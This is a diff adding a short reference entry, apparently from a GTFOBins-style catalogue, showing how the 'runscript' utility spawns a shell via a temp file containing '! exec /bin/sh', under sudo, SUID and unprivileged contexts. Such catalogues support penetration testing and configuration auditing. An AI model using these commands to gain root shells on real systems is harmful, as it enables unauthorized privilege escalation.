@@ -1,0 +1,17 @@
+runscript
+=========
+
+Shell
+-----
+
+[Sudo]
+    echo '! exec /bin/sh' >/path/to/temp-file
+runscript /path/to/temp-file
+
+[SUID]
+    echo '! exec /bin/sh' >/path/to/temp-file
+runscript /path/to/temp-file
+
+[Unprivileged]
+    echo '! exec /bin/sh' >/path/to/temp-file
+runscript /path/to/temp-file
